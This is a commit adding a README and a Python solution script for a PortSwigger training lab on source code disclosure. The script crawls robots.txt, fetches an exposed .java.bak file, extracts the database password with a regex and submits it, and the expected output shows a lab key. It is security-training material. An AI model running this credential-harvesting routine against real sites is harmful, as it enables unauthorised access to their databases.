232fcb437c298acd04026f929d23691e081da5a9
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-03 03:02:47 +0300

    Added 'Source code disclosure via backup files' lab

---
+++ Information Disclosure/source_code_disclosure_via_backup_files/README.md
@@ -0,0 +1,28 @@
+# Hack Steps
+
+1. Fetch /robots.txt file
+2. List the hidden directory
+3. Fetch the hidden backup file
+4. Extract the key
+5. Submit the answer
+
+# Run Script
+
+1. change the URL of the lab
+2. Start script
+
+```
+~$ python source_code_disclosure_via_backup_files.py
+```
+
+# Expected Output
+
+```
+1. Fetching the robots.txt file.. OK
+2. Searching for hidden files.. OK => /backup
+3. Fetching the backup directory.. OK
+4. Extracting the path to the backup file.. OK => /backup/ProductTemplate.java.bak
+5. Fetching the backup file.. OK
+6. Extracting key .. OK => xydew2o4wwjnyn3z444f8rn3pdad1ld2
+7. Submitting the answer.. OK
+```
---
+++ Information Disclosure/source_code_disclosure_via_backup_files/source_code_disclosure_via_backup_files.py
@@ -0,0 +1,73 @@
+################################################################
+#
+# Author: Ahmed Elqalawii
+#
+# Date: 3/9/2023
+#
+# PortSwigger LAB: Source code disclosure via backup files
+#
+# Steps: 1. Fetch /robots.txt file
+#        2. List the hidden directory
+#        3. Fetch the hidden backup file
+#        4. Extract the key
+#        5. Submit the answer
+#
+#################################################################
+
+###########
+# imports
+###########
+import requests
+import re
+from colorama import Fore
+
+# change this url to your lab
+url = "https://0afc00ef04877e108542811f0018009d.web-security-academy.net"
+
+try:
+    robots = requests.get(
+        f"{url}/robots.txt")  # fetch /robots.txt file
+    if robots.status_code == 200:  # if response is OK
+        print(Fore.WHITE + "1. Fetching the robots.txt file.. " + Fore.GREEN + "OK")
+        hidden_name = re.findall("Disallow: (.*)",
+                                 robots.text)[0]  # extract the hidded name
+        print(Fore.WHITE + "2. Searching for hidden files.. " +
+              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_name)
+        try:  # try to list the hidden directory
+            hidden_dir = requests.get(f"{url}{hidden_name}")
+            if hidden_dir.status_code == 200:  # if listing is OK
+                print(Fore.WHITE + "3. Fetching the backup directory.. " +
+                      Fore.GREEN + "OK")
+                backup_path = re.findall(
+                    "href='(.*)'>", hidden_dir.text)[0]  # extract the path the the backup file
+                print(Fore.WHITE + "4. Extracting the path to the backup file.. " +
+                      Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + backup_path)
+            try:  # try to fetch the backup file
+                backup_file = requests.get(f"{url}{backup_path}")
+                if backup_file.status_code == 200:  # if fetching backup file is OK
+                    print(Fore.WHITE + "5. Fetching the backup file " +
+                          Fore.GREEN + "OK")
+                    key = re.findall(
+                        r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]  # extract the key
+                    print(Fore.WHITE + "6. Extracting key.. " +
+                          Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + key)
+                try:  # try to submit the answer
+                    data = {
+                        "answer": key
+                    }
+                    submit_answer = requests.post(
+                        f"{url}/submitsolution", data)  # submit the answer
+                    if submit_answer.status_code == 200:
+                        print(Fore.WHITE + "7. Submitting the answer.. " +
+                              Fore.GREEN + "OK")
+                except:
+                    print(
+                        Fore.RED + "[!] Failed to submit the answer through exception")
+            except:
+                print(
+                    Fore.RED + "[!] Failed to fetch the backup file through exception")
+        except:
+            print(
+                Fore.RED + "[!] Failed to list the hidden directory through exception")
+except:
+    print(Fore.RED + "[!] Failed to fetch /robots.txt through exception")
